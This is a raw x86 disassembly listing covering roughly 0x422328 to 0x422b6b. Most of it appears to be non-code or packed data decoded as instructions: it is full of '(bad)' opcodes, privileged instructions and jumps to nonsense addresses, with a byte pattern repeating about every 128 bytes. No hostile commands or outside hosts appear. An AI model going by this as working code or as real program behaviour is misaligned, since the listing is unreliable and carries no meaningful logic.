  422328:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422329:	fucom  st(4)
  42232b:	test   ch,0x27
  42232e:	xor    eax,0xceb9d044
  422333:	xchg   ebx,eax
  422334:	repnz xor eax,0x0
	...
  422342:	push   edx
  422343:	add    al,0xa2
  422345:	xor    dh,0xa6
  422348:	jb     0x42231e
  42234a:	ins    DWORD PTR es:[edi],dx
  42234b:	xor    dh,BYTE PTR [edx]
  42234d:	and    eax,0xe83bdf35
  422352:	neg    eax
  422354:	add    DWORD PTR [eax],eax
  422356:	pop    esp
  422357:	add    BYTE PTR [eax],al
  422359:	add    BYTE PTR [eax],cl
  42235b:	imul   esp,DWORD PTR [ecx+edx*8],0xffffffe6
  42235f:	xor    ch,BYTE PTR [ebp-0x160f627f]
  422365:	sbb    dh,BYTE PTR [esi*1+0x2a07c91e]
  42236c:	cld    
  42236d:	pop    ds
  42236e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42236f:	into   
  422370:	stos   BYTE PTR es:[edi],al
  422371:	into   
  422372:	out    0x77,eax
  422374:	jmp    FWORD PTR [edx+0x6460e023]
  42237a:	push   edx
  42237b:	add    eax,0xcd76fefc
  422380:	or     bh,BYTE PTR [edi]
  422382:	test   ebp,edx
  422384:	out    0x48,eax
  422386:	div    DWORD PTR [ecx-0x36f47fba]
  42238c:	add    DWORD PTR ds:0xe9c38f2b,esp
  422392:	rol    edx,1
  422394:	xchg   ebx,eax
  422395:	dec    ecx
  422396:	mov    fs,ecx
  422398:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422399:	mov    al,ds:0xdbbe2f0d
  42239e:	scas   eax,DWORD PTR es:[edi]
  42239f:	jnp    0x422348
  4223a1:	repnz mov ds:0x4c239898,al
  4223a7:	rcl    DWORD PTR [ebp+0x5b],0xef
  4223ab:	or     al,BYTE PTR [ebx+0x5239293b]
  4223b1:	je     0x4223e2
  4223b3:	pop    ds
  4223b4:	data16 sahf 
	...
  4223c2:	cmp    BYTE PTR [edx-0x6a],ch
  4223c5:	add    edx,esi
  4223c7:	(bad)  
  4223c8:	mov    ebp,0xdb4ef67b
  4223cd:	out    0xd,eax
  4223cf:	out    0xf3,al
  4223d1:	dec    esi
  4223d2:	push   ebx
  4223d3:	fld    DWORD PTR [ecx]
  4223d5:	add    BYTE PTR [eax+eax*1+0x0],bl
  4223d9:	add    ah,bl
  4223db:	fmul   QWORD PTR [edx+0x15]
  4223de:	cdq    
  4223df:	(bad)  
  4223e0:	sub    bl,0xfc
  4223e3:	test   eax,ebx
  4223e5:	add    DWORD PTR [ebx+0x3b200155],ebx
  4223eb:	mov    ebx,0x261c10f8
  4223f0:	pop    es
  4223f1:	adc    edx,DWORD PTR [edi+0x2d7119fc]
  4223f7:	pop    edx
  4223f8:	pop    edi
  4223f9:	addr16 and ah,ch
  4223fc:	dec    edx
  4223fd:	popa   
  4223fe:	dec    ecx
  4223ff:	(bad)  
  422400:	outs   dx,DWORD PTR ds:[esi]
  422401:	push   ss
  422402:	jmp    0x42242c
  422404:	push   eax
  422405:	loope  0x4223e0
  422407:	popa   
  422408:	jg     0x422464
  42240a:	push   es
  42240b:	sbb    eax,0xbcfd18d5
  422410:	ret    
  422411:	not    BYTE PTR [ebx]
  422413:	fwait
  422414:	mov    ch,0xd0
  422416:	add    ecx,DWORD PTR [edx+0x78]
  422419:	jle    0x422461
  42241b:	sbb    al,0xc
  42241d:	add    ebx,DWORD PTR [edx]
  42241f:	push   ebx
  422420:	gs xchg ecx,eax
  422422:	aam    0x9
  422424:	mov    bl,0x28
  422426:	or     eax,0x726e8312
  42242b:	aas    
  42242c:	push   ecx
  42242d:	test   al,0xd5
  42242f:	xor    al,0x4b
  422431:	lds    ebp,FWORD PTR [eax]
  422433:	jb     0x422476
  422435:	cdq    
	...
  422442:	jmp    0x7a729f00
  422447:	repz jmp 0x422443
  42244a:	fimul  DWORD PTR [esp+eax*2+0x6c]
  42244e:	jbe    0x422466
  422450:	int3   
  422451:	icebp  
  422452:	scas   eax,DWORD PTR es:[edi]
  422453:	fld    DWORD PTR [ecx]
  422455:	add    BYTE PTR [eax+eax*1+0x0],bl
  422459:	add    BYTE PTR [eax],dl
  42245b:	(bad)  
  42245c:	loop   0x422425
  42245e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42245f:	pop    ebp
  422460:	adc    eax,0x95446648
  422465:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422466:	scas   al,BYTE PTR es:[edi]
  422467:	push   0xc2b54f73
  42246c:	in     al,dx
  42246d:	pop    esi
  42246e:	dec    edx
  42246f:	scas   eax,DWORD PTR es:[edi]
  422470:	jmp    0x1f97:0xe71781ac
  422477:	push   eax
  422478:	ror    DWORD PTR ds:0x91c8cf6c,1
  42247e:	and    al,0xc1
  422480:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422481:	test   WORD PTR [ebx],ax
  422484:	jle    0x422418
  422486:	push   ds
  422487:	sbb    al,bl
  422489:	ja     0x42246d
  42248b:	ret    0xacb0
  42248e:	mov    BYTE PTR [ecx],dl
  422490:	jge    0x4224e6
  422492:	and    bl,ah
  422494:	rdmsr  
  422496:	jbe    0x4224af
  422498:	mov    eax,ds:0x4fffaa3e
  42249d:	out    dx,al
  42249e:	cmp    DWORD PTR [esi+edx*8-0x3dd07a2e],esi
  4224a5:	lahf   
  4224a6:	ret    
  4224a7:	pop    es
  4224a8:	pop    ebx
  4224a9:	inc    eax
  4224aa:	in     eax,dx
  4224ab:	pop    es
  4224ac:	(bad)  [eax+0x1dcf0da4]
  4224b2:	xlat   BYTE PTR ds:[ebx]
  4224b3:	inc    ebp
  4224b4:	mov    al,ds:0x2d
	...
  4224c1:	add    BYTE PTR [ebx+0x41],bl
  4224c4:	pop    ebx
  4224c5:	iret   
  4224c6:	pop    ebx
  4224c7:	(bad)  
  4224c9:	aad    0xf
  4224cb:	ss dec esp
  4224cd:	dec    esi
  4224ce:	mov    BYTE PTR [ebp-0x25f4d2ad],bh
  4224d4:	add    DWORD PTR [eax],eax
  4224d6:	pop    esp
  4224d7:	add    BYTE PTR [eax],al
  4224d9:	add    BYTE PTR [ebx+0x5f7b155a],dl
  4224df:	gs ds rsm 
  4224e3:	ss xchg edx,eax
  4224e5:	xchg   edi,eax
  4224e6:	scas   al,BYTE PTR es:[edi]
  4224e7:	test   al,0x94
  4224e9:	adc    dh,BYTE PTR [edx+0x49]
  4224ec:	jmp    0x4224cc
  4224ee:	inc    ecx
  4224ef:	or     al,al
  4224f1:	push   cs
  4224f2:	outs   dx,DWORD PTR ds:[esi]
  4224f3:	xchg   ah,bl
  4224f5:	xchg   esi,eax
  4224f6:	inc    edi
  4224f7:	pop    ecx
  4224f8:	je     0x42249e
  4224fa:	int    0x8e
  4224fc:	popf   
  4224fd:	xor    al,0x57
  4224ff:	sahf   
  422500:	into   
  422501:	lahf   
  422502:	push   esi
  422503:	and    ah,cl
  422505:	xchg   dx,ax
  422507:	cli    
  422508:	(bad)  
  42250a:	mov    cl,0xf3
  42250c:	ins    BYTE PTR es:[edi],dx
  42250d:	mov    ebx,0xc7a97bd3
  422512:	call   0x3e41:0x98081d8d
  422519:	sub    DWORD PTR [ebp+0x2fb16a3d],ebp
  42251f:	add    edx,esi
  422521:	lods   eax,DWORD PTR ds:[esi]
  422522:	xchg   edx,eax
  422523:	popf   
  422524:	loop   0x42250c
  422526:	xchg   ebx,eax
  422527:	adc    eax,0xeecf8daf
  42252c:	data16 sahf 
  42252e:	xor    al,0xb
  422530:	sar    dh,1
  422532:	mov    dl,BYTE PTR [ebp+edx*1-0x57]
	...
  422542:	fwait
  422543:	test   DWORD PTR [ebp+0x3c],esp
  422546:	jg     0x422544
  422548:	(bad)  [edi-0x65be08a1]
  42254e:	sub    DWORD PTR [ebx+0x34],0x1da6739
  422555:	add    BYTE PTR [eax+eax*1+0x0],bl
  422559:	add    BYTE PTR [edx],dl
  42255b:	rol    BYTE PTR [edx-0x6a5c5ff4],cl
  422561:	sub    BYTE PTR [ebp-0x12c11ffd],dl
  422567:	inc    ebx
  422568:	outs   dx,BYTE PTR ds:[esi]
  422569:	pop    eax
  42256a:	ins    BYTE PTR es:[edi],dx
  42256b:	sub    DWORD PTR [ebx+0x16f52670],0xffffffcd
  422572:	pushf  
  422573:	and    esp,DWORD PTR [eax-0x1a6a6038]
  422579:	push   ecx
  42257a:	frstor [edi]
  42257c:	adc    DWORD PTR [eax+0x7609cfc9],0x53d12bfe
  422586:	loop   0x42255b
  422588:	mov    edi,0x1b3ed251
  42258d:	and    eax,0x26b60280
  422592:	jno    0x422521
  422594:	push   ebx
  422595:	mov    WORD PTR [ecx+0x11],ds
  422598:	nop
  422599:	mov    ah,0x9a
  42259b:	add    eax,0x7341f16d
  4225a0:	mov    ebp,0xcc6b15bb
  4225a5:	dec    esi
  4225a6:	push   edi
  4225a7:	push   edi
  4225a8:	inc    esp
  4225a9:	shl    BYTE PTR [ebp+ebx*8-0x52],0xb4
  4225ae:	aaa    
  4225af:	scas   eax,DWORD PTR es:[edi]
  4225b0:	retf   
  4225b1:	int    0xe1
  4225b3:	cmp    al,0x40
  4225b5:	mov    ds:0x0,al
	...
  4225c2:	outs   dx,BYTE PTR ds:[esi]
  4225c3:	jae    0x4225b5
  4225c5:	retf   0xcbfd
  4225c8:	jle    0x4225c1
  4225ca:	repz xor eax,0xcf728ce9
  4225d0:	pop    ebp
  4225d1:	rol    bl,cl
  4225d3:	fiadd  DWORD PTR [ecx]
  4225d5:	add    BYTE PTR [eax+eax*1+0x0],bl
  4225d9:	add    bl,bl
  4225db:	xchg   DWORD PTR [eax+0x48ceac55],ebp
  4225e1:	pushf  
  4225e2:	ins    DWORD PTR es:[edi],dx
  4225e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4225e4:	test   al,0x55
  4225e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4225e7:	xchg   esi,eax
  4225e8:	push   eax
  4225e9:	dec    esp
  4225ea:	out    0x9d,al
  4225ec:	cmp    ch,bh
  4225ee:	and    al,0x17
  4225f0:	div    DWORD PTR [ebx+0x4e1a8f1d]
  4225f6:	jmp    0x4225e6
  4225f8:	adc    al,0xac
  4225fa:	ins    BYTE PTR es:[edi],dx
  4225fb:	mov    bl,0x20
  4225fd:	lea    edx,[edx-0x73]
  422600:	rcr    DWORD PTR ds:0xb317725e,1
  422606:	xor    BYTE PTR [ecx],0x2b
  422609:	test   al,0x4f
  42260b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42260c:	je     0x4225e3
  42260e:	mov    WORD PTR [eax+0x5d75a2a5],?
  422614:	xor    DWORD PTR [ebx-0x53],esp
  422617:	or     al,0x74
  422619:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42261a:	retf   
  42261b:	data16 js 0x4225c6
  42261e:	loopne 0x4225a3
  422620:	mov    dl,0x45
  422622:	sbb    ebp,DWORD PTR [edx-0x9b6b1dc]
  422628:	xchg   esi,eax
  422629:	outs   dx,BYTE PTR ds:[esi]
  42262a:	ret    0xb65b
  42262d:	rol    BYTE PTR [esp+eiz*8-0x24],0xce
  422632:	adc    eax,0xf218ce
	...
  42263f:	add    BYTE PTR [eax],al
  422641:	add    ch,dh
  422643:	adc    al,0xae
  422645:	adc    ebp,edi
  422647:	mov    ebx,0x84e6f6fd
  42264c:	lds    ebp,FWORD PTR [edx+0x614a2919]
  422652:	pop    ds
  422653:	fild   DWORD PTR [ecx]
  422655:	add    BYTE PTR [eax+eax*1+0x0],bl
  422659:	add    BYTE PTR [edi],dh
  42265b:	xor    ecx,DWORD PTR [eax-0x5e]
  42265e:	shl    DWORD PTR [edi],1
  422660:	aas    
  422661:	mov    ah,0x68
  422663:	sbb    dh,dh
  422665:	ret    0xd0f5
  422668:	retf   
  422669:	push   0xffffffec
  42266b:	ret    
  42266c:	dec    ebp
  42266d:	sti    
  42266e:	sahf   
  42266f:	push   0xea378ece
  422674:	hlt    
  422675:	jg     0x422690
  422677:	shr    BYTE PTR [eax],cl
  422679:	jl     0x42267e
  42267b:	pop    ds
  42267c:	mov    ds:0xedd2d16,al
  422681:	cmp    dh,BYTE PTR [ecx-0x709ecbe]
  422687:	iret   
  422688:	cmp    WORD PTR [edi+0x2f],sp
  42268c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42268d:	dec    edx
  42268e:	jnp    0x4226b4
  422690:	jo     0x422696
  422692:	sahf   
  422693:	scas   al,BYTE PTR es:[edi]
  422694:	test   al,0xa4
  422696:	sbb    eax,0xc1f1bb32
  42269b:	or     ch,BYTE PTR [edi+eax*4]
  42269e:	and    DWORD PTR [eax-0x372ef4d0],eax
  4226a4:	lods   al,BYTE PTR ds:[esi]
  4226a5:	jb     0x42265a
  4226a7:	xor    DWORD PTR [edi+ecx*8-0x7c79d3ff],esi
  4226ae:	sbb    edi,DWORD PTR [ecx+0x7b8056de]
  4226b4:	jae    0x4226cf
	...
  4226c2:	cmp    esi,DWORD PTR [ecx-0x9200fa9]
  4226c8:	mov    edi,0xbb1c16fb
  4226cd:	shl    BYTE PTR [edi-0x9],0x14
  4226d1:	push   ebx
  4226d2:	jnp    0x4226af
  4226d4:	add    DWORD PTR [eax],eax
  4226d6:	pop    esp
  4226d7:	add    BYTE PTR [eax],al
  4226d9:	add    bh,dl
  4226db:	or     dh,BYTE PTR [edx+0x10]
  4226de:	push   ebx
  4226df:	aaa    
  4226e0:	cmp    bl,BYTE PTR [edi+0x78]
  4226e3:	sbb    dh,BYTE PTR [ecx-0x156a1722]
  4226e9:	jmp    0xd0c528b6
  4226ee:	xchg   eax,ecx
  4226f0:	retf   0xc988
  4226f3:	loope  0x4226b3
  4226f5:	jp     0x4226b2
  4226f7:	test   DWORD PTR [edx+0x69c9ff],eax
  4226fd:	xchg   esi,eax
  4226fe:	mov    edi,0x97921bb8
  422703:	(bad)  
  422704:	xchg   ebp,eax
  422705:	int3   
  422706:	xchg   edi,eax
  422707:	jns    0x42269a
  422709:	imul   eax,DWORD PTR [ebp-0x5b524861],0x463d62d5
  422713:	inc    esp
  422714:	inc    edi
  422715:	inc    ebp
  422716:	lods   eax,DWORD PTR ds:[esi]
  422717:	and    cl,BYTE PTR es:[eax-0x4e]
  42271b:	jle    0x422751
  42271d:	mov    al,0x8f
  42271f:	jecxz  0x42275c
  422721:	in     eax,0x4a
  422723:	xlat   BYTE PTR ds:[ebx]
  422724:	mov    eax,ds:0x688e3de7
  422729:	dec    ecx
  42272a:	fs ins DWORD PTR es:[edi],dx
  42272c:	data16 cmc 
  42272e:	inc    ecx
  42272f:	dec    ecx
  422730:	lock and esp,esp
  422733:	fiadd  DWORD PTR [edi+esi*1+0x0]
	...
  42273f:	add    BYTE PTR [eax],al
  422741:	add    ah,dl
  422743:	sqrtps xmm6,xmm0
  422746:	(bad)  
  422748:	cmc    
  422749:	das    
  42274a:	sbb    BYTE PTR [eax],cl
  42274c:	xchg   ebx,eax
  42274d:	iret   
  42274e:	mov    dh,0x33
  422750:	aad    0xf
  422752:	xlat   BYTE PTR ds:[ebx]
  422753:	fild   DWORD PTR [ecx]
  422755:	add    BYTE PTR [eax+eax*1+0x0],bl
  422759:	add    cl,ch
  42275b:	les    ebx,FWORD PTR [esi+0xaab0dac]
  422761:	pushf  
  422762:	push   eax
  422763:	sbb    esi,DWORD PTR ds:0xb8f6ea1a
  422769:	shr    DWORD PTR [eax],cl
  42276b:	ret    
  42276c:	lock idiv DWORD PTR ds:[edx+0x5b]
  422771:	cmp    DWORD PTR [esi-0x4aa22739],esi
  422777:	cmp    BYTE PTR [eax-0x298fa287],bl
  42277d:	dec    ecx
  42277e:	mov    DWORD PTR [esi-0x4d],ebp
  422781:	cld    
  422782:	data16 (bad) 
  422784:	cmp    DWORD PTR [ebx-0x50cda29a],ecx
  42278a:	bound  ecx,QWORD PTR [eax-0x7cfbe156]
  422790:	adc    eax,DWORD PTR [edx-0x5d]
  422793:	xchg   esi,eax
  422794:	ins    BYTE PTR es:[edi],dx
  422795:	sbb    DWORD PTR [ebx+0x79],eax
  422798:	popa   
  422799:	jae    0x422769
  42279b:	mov    ss,WORD PTR [edx-0x4d]
  42279e:	stos   DWORD PTR es:[edi],eax
  42279f:	cli    
  4227a0:	fcomp  DWORD PTR [esi+eiz*2-0x17a21d35]
  4227a7:	and    ecx,0x3ecc82ed
  4227ad:	jae    0x4227f9
  4227af:	jns    0x422792
  4227b1:	rcl    edi,cl
  4227b3:	inc    esp
  4227b4:	mov    dl,0xba
	...
  4227c2:	int    0x2d
  4227c4:	xchg   ebp,eax
  4227c5:	inc    ebx
  4227c6:	cmc    
  4227c7:	sti    
  4227c8:	fild   QWORD PTR [edi-0x5bdf5fa9]
  4227ce:	retf   
  4227cf:	adc    BYTE PTR [edi],ah
  4227d1:	push   ebp
  4227d2:	xor    ebx,esp
  4227d4:	add    DWORD PTR [eax],eax
  4227d6:	pop    esp
  4227d7:	add    BYTE PTR [eax],al
  4227d9:	add    BYTE PTR [esi-0x63384327],bh
  4227df:	and    al,0x11
  4227e1:	call   0xf8ef:0x82d64934
  4227e8:	sbb    DWORD PTR [ebx+0x14],eax
  4227eb:	add    dl,bl
  4227ed:	gs adc bh,bl
  4227f0:	mov    cl,0x2d
  4227f2:	stos   BYTE PTR es:[edi],al
  4227f3:	retf   0x2258
  4227f6:	neg    dh
  4227f8:	jnp    0x42279f
  4227fa:	cmp    ah,BYTE PTR [eax-0x17]
  4227fd:	mov    cl,dl
  4227ff:	dec    esp
  422800:	jp     0x4227ce
  422802:	psubsw mm2,QWORD PTR [ebx]
  422805:	shr    BYTE PTR [eax+0x30],1
  422808:	mov    ah,0xd1
  42280a:	fadd   QWORD PTR [ecx-0xe731c67]
  422810:	lods   eax,DWORD PTR ds:[esi]
  422811:	sub    DWORD PTR [edx+0x8],edi
  422814:	lock add eax,0x20e485
  42281a:	pop    ss
  42281b:	adc    DWORD PTR [edi],0xe0470b9b
  422821:	xor    al,dh
  422823:	mov    cl,0x19
  422825:	jnp    0x42288f
  422827:	js     0x4227f6
  422829:	in     eax,dx
  42282a:	xor    ah,cl
  42282c:	xor    al,0xd1
  42282e:	enter  0x4505,0xfa
  422832:	push   edi
  422833:	lahf   
  422834:	jnp    0x422809
	...
  422842:	adc    esp,DWORD PTR [edi+eiz*8+0xb]
  422846:	test   DWORD PTR [ebx-0xce58301],0x1bfa4cfc
  422850:	ins    BYTE PTR es:[edi],dx
  422851:	cmp    BYTE PTR [edi+0x5c0001dc],cl
  422857:	add    BYTE PTR [eax],al
  422859:	add    BYTE PTR [esi],bl
  42285b:	int    0x54
  42285d:	mov    WORD PTR [edx],gs
  42285f:	mov    ecx,0xa7b6494c
  422864:	xor    ch,BYTE PTR [ebp+0x4e62090f]
  42286a:	push   0x52
  42286c:	pop    esi
  42286d:	js     0x422814
  42286f:	xor    bh,bh
  422871:	out    0xac,al
  422873:	in     al,0x80
  422875:	loop   0x4228a9
  422877:	nop
  422878:	adc    BYTE PTR [eax],bl
  42287a:	cmp    al,0x3d
  42287c:	xor    ah,bh
  42287e:	jp     0x4228c2
  422880:	or     DWORD PTR [edx],edx
  422882:	ror    cl,0x13
  422885:	jns    0x422833
  422887:	(bad)  
  422889:	cmc    
  42288a:	sub    eax,0xfa89c2bf
  42288f:	adc    ch,BYTE PTR [ecx-0x67]
  422892:	popf   
  422893:	push   edx
  422894:	popa   
  422895:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422896:	pop    ebp
  422897:	test   BYTE PTR [eax],bl
  422899:	push   ebp
  42289a:	jne    0x422876
  42289c:	push   ebx
  42289d:	xchg   ebx,eax
  42289e:	sub    eax,0x14f11742
  4228a3:	add    ebx,edi
  4228a5:	outs   dx,DWORD PTR ds:[esi]
  4228a6:	mov    WORD PTR [edx+esi*2+0x7ac9282d],fs
  4228ad:	xor    edx,DWORD PTR [bp+di-0x3bd4]
  4228b2:	xlat   BYTE PTR ds:[ebx]
  4228b3:	jnp    0x422874
  4228b5:	jmp    0x0:0x0
  4228bc:	add    BYTE PTR [eax],al
  4228be:	add    BYTE PTR [eax],al
  4228c0:	add    BYTE PTR [eax],al
  4228c2:	add    dl,BYTE PTR ss:[ebp+0xc]
  4228c6:	jne    0x422927
  4228c8:	jg     0x422904
  4228ca:	clc    
  4228cb:	cs aas 
  4228cd:	push   0x1dd8280a
  4228d2:	sti    
  4228d3:	iret   
  4228d4:	add    DWORD PTR [eax],eax
  4228d6:	pop    esp
  4228d7:	add    BYTE PTR [eax],al
  4228d9:	add    cl,bl
  4228db:	adc    esi,DWORD PTR [esi+0x129ed04a]
  4228e1:	js     0x422884
  4228e3:	mov    cl,0x8c
  4228e5:	add    al,0x16
  4228e7:	sub    edx,DWORD PTR [edx-0x31]
  4228ea:	or     eax,0x55a249ff
  4228ef:	(bad)  
  4228f0:	jbe    0x4228c9
  4228f2:	shl    DWORD PTR [edi],0x9e
  4228f5:	fldcw  WORD PTR [edi-0x504029dd]
  4228fb:	mov    eax,ds:0x64b72ca0
  422900:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422901:	and    DWORD PTR [edx+esi*4+0x4a],eax
  422905:	(bad)  
  422906:	pop    ebx
  422907:	xchg   DWORD PTR [eax+0x77],edx
  42290a:	pop    edx
  42290b:	stos   DWORD PTR es:[edi],eax
  42290c:	jae    0x42296c
  42290e:	cmp    eax,DWORD PTR [esi-0x6eead4ec]
  422914:	jecxz  0x422995
  422916:	xchg   esp,eax
  422917:	test   al,0x34
  422919:	and    BYTE PTR [esi-0x6d80f51f],dh
  42291f:	xchg   ecx,eax
  422920:	push   0x59
  422922:	lods   eax,DWORD PTR ds:[esi]
  422923:	sub    DWORD PTR [ecx],edi
  422925:	push   ebx
  422926:	push   edi
  422927:	test   BYTE PTR [ebx],bh
  422929:	jo     0x4228c8
  42292b:	mov    eax,0xe702eae7
  422930:	pop    ecx
  422931:	or     eax,DWORD PTR [ebp+0xd1d086]
	...
  42293f:	add    BYTE PTR [eax],al
  422941:	add    BYTE PTR [eax],cl
  422943:	mov    cl,0x72
  422945:	cmp    edi,ebx
  422947:	sti    
  422948:	dec    ecx
  422949:	mov    bl,0x94
  42294b:	je     0x422924
  42294d:	call   0xd057:0xdaec3b79
  422954:	add    DWORD PTR [eax],eax
  422956:	pop    esp
  422957:	add    BYTE PTR [eax],al
  422959:	add    BYTE PTR [ebx+0x2a],dh
  42295c:	jg     0x422958
  42295e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42295f:	scas   al,BYTE PTR es:[edi]
  422960:	inc    eax
  422961:	and    ebp,DWORD PTR [esi+0x11]
  422964:	pop    esp
  422965:	out    0x3,al
  422967:	sub    eax,DWORD PTR [edx]
  422969:	(bad)
  42296c:	cmp    DWORD PTR [edi+esi*4],ecx
  42296f:	and    BYTE PTR [ebp+0x461fc091],0x6f
  422976:	fstp   QWORD PTR [edx+0x239a837c]
  42297c:	and    ecx,edi
  42297e:	or     eax,0x4344fda8
  422983:	xor    eax,0x2af437f9
  422988:	mov    al,0xe1
  42298a:	sub    BYTE PTR [esi+edx*4-0x2ace4a01],bh
  422991:	xor    al,0xf6
  422993:	loop   0x42293e
  422995:	into   
  422996:	and    eax,DWORD PTR [ecx+edx*4]
  422999:	jns    0x422940
  42299b:	gs xchg ebx,eax
  42299d:	fimul  WORD PTR [edx]
  42299f:	int    0x3b
  4229a1:	adc    al,0x67
  4229a3:	mul    DWORD PTR [edi]
  4229a5:	cmp    al,0x39
  4229a7:	aad    0x4e
  4229a9:	mov    eax,ds:0xc5ef8685
  4229ae:	or     al,0x35
  4229b0:	gs in  eax,0x73
  4229b3:	push   0xffffffe6
  4229b5:	jno    0x4229b7
	...
  4229bf:	add    BYTE PTR [eax],al
  4229c1:	add    bh,bl
  4229c3:	push   ebx
  4229c4:	mov    dl,0x4f
  4229c6:	mov    esi,0x67d3ffef
  4229cb:	xchg   ecx,edi
  4229cd:	adc    al,0x26
  4229cf:	repz into 
  4229d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4229d2:	mov    bl,0xd0
  4229d4:	add    DWORD PTR [eax],eax
  4229d6:	pop    esp
  4229d7:	add    BYTE PTR [eax],al
  4229d9:	add    bh,dl
  4229db:	push   ebp
  4229dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4229dd:	xor    DWORD PTR [esi],0xdfb5b715
  4229e3:	pop    edx
  4229e4:	add    ebp,esp
  4229e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4229e7:	ja     0x422a36
  4229e9:	or     edx,DWORD PTR [ecx+edi*1]
  4229ec:	and    eax,0xfa360b90
  4229f1:	lds    edx,FWORD PTR [ecx]
  4229f3:	push   edx
  4229f4:	push   edx
  4229f5:	dec    ecx
  4229f6:	xor    eax,DWORD PTR [edx+0x18bd7892]
  4229fc:	and    bl,BYTE PTR [edx*4+0x7cca1b06]
  422a03:	push   esp
  422a04:	sbb    eax,0x2daf761c
  422a09:	mov    ah,0x21
  422a0b:	test   DWORD PTR [edi],ecx
  422a0d:	pop    edi
  422a0e:	add    DWORD PTR [ebx-0x6bd73bc],esi
  422a14:	xchg   ebp,eax
  422a15:	and    dl,BYTE PTR [ecx+ecx*2-0xf]
  422a19:	in     al,0x12
  422a1b:	inc    ebp
  422a1c:	xchg   edx,eax
  422a1d:	ins    DWORD PTR es:[edi],dx
  422a1e:	je     0x422a91
  422a20:	out    0xd6,eax
  422a22:	stc    
  422a23:	(bad)
  422a26:	jns    0x422aa5
  422a28:	mov    dl,0x66
  422a2a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422a2b:	dec    ebp
  422a2c:	rol    BYTE PTR [edi-0x34],0x5e
  422a30:	pop    ds
  422a31:	sbb    edi,edi
  422a33:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422a34:	pop    edi
  422a35:	dec    edx
	...
  422a42:	xchg   DWORD PTR [ebx+edx*8],ecx
  422a45:	fcmovu st,st(3)
  422a47:	fisttp WORD PTR [edi+0x640ccb5d]
  422a4d:	push   ss
  422a4e:	jns    0x422a14
  422a50:	or     DWORD PTR [ebx+0x1d10f],0x5c
  422a57:	add    BYTE PTR [eax],al
  422a59:	add    BYTE PTR ds:0xc7121bc7,ch
  422a5f:	sbb    ch,0x46
  422a62:	sub    ebp,edi
  422a64:	ret    
  422a65:	scas   al,BYTE PTR es:[edi]
  422a66:	push   0xffffffc7
  422a68:	loopne 0x422a11
  422a6a:	mov    eax,ds:0x9946f7ea
  422a6f:	adc    edi,esi
  422a71:	lahf   
  422a72:	push   es
  422a73:	mov    ch,0x56
  422a75:	or     esp,DWORD PTR [eax]
  422a77:	aaa    
  422a78:	(bad)  
  422a79:	ja     0x422aac
  422a7b:	xlat   BYTE PTR ds:[ebx]
  422a7c:	xor    eax,0x628d9ea5
  422a81:	xor    al,0x62
  422a83:	cmp    eax,0xeffe7cbc
  422a88:	jmp    0x422a47
  422a8a:	mov    al,ds:0x239bc29f
  422a8f:	stos   BYTE PTR es:[edi],al
  422a90:	cld    
  422a91:	mov    bh,0xbb
  422a93:	imul   esp,DWORD PTR [ecx+0x38],0xefb0ce0b
  422a9a:	jmp    0xfcbc:0x6b4efe70
  422aa1:	ja     0x422b09
  422aa3:	(bad)  
  422aa4:	mov    edx,0xb80a60aa
  422aa9:	cmp    BYTE PTR [edi-0x3f],cl
  422aac:	jno    0x422a67
  422aae:	pop    DWORD PTR [ecx+edi*4]
  422ab1:	lds    ebp,FWORD PTR [eax+0x92f8da]
	...
  422abf:	add    BYTE PTR [eax],al
  422ac1:	add    BYTE PTR [edi-0x28db29d],bl
  422ac7:	jle    0x422a88
  422ac9:	out    dx,eax
  422aca:	sbb    edi,esp
  422acc:	mov    BYTE PTR [esi+edi*8+0x6bd0d674],dh
  422ad3:	rol    DWORD PTR [ecx],1
  422ad5:	add    BYTE PTR [eax+eax*1+0x0],bl
  422ad9:	add    ah,bl
  422adb:	cmp    dl,BYTE PTR [eax-0x23d12ad0]
  422ae1:	in     eax,dx
  422ae2:	sahf   
  422ae3:	out    dx,al
  422ae4:	les    ebx,FWORD PTR [ebx-0x40528960]
  422aea:	aad    0xd8
  422aec:	or     eax,0x4b625b15
  422af1:	adc    ebp,DWORD PTR [esp+0x5b]
  422af5:	clc    
  422af6:	call   0xc6536da3
  422afb:	test   eax,0xc2026d56
  422b00:	mov    eax,ds:0x7a251337
  422b05:	jnp    0x422b2f
  422b07:	or     ah,bl
  422b09:	mov    ebx,0xacddcbc0
  422b0e:	or     eax,0x22c8b328
  422b13:	in     al,dx
  422b14:	shl    DWORD PTR ds:0xd8727dc7,cl
  422b1a:	sbb    ecx,DWORD PTR [esi+0x60b18fb6]
  422b20:	into   
  422b21:	xlat   BYTE PTR ds:[ebx]
  422b22:	scas   eax,DWORD PTR es:[edi]
  422b23:	fcom   QWORD PTR [ecx+edi*8-0x595f01be]
  422b2a:	in     eax,dx
  422b2b:	ror    BYTE PTR [ecx-0x1a4aa817],0x32
  422b32:	sbb    ah,BYTE PTR [ebp+0x11c3]
	...
  422b40:	add    BYTE PTR [eax],al
  422b42:	jo     0x422b67
  422b44:	and    eax,0x7c6f7769
  422b49:	cmp    esp,DWORD PTR [eax-0xe4311e4]
  422b4f:	fisttp WORD PTR [edx]
  422b51:	adc    eax,0x1d1c7
  422b56:	pop    esp
  422b57:	add    BYTE PTR [eax],al
  422b59:	add    BYTE PTR [ecx],dh
  422b5b:	adc    DWORD PTR [edx+0x4effe596],0xc46b79cc
  422b65:	fstp   DWORD PTR ds:0x14325302
  422b6b:	int3   
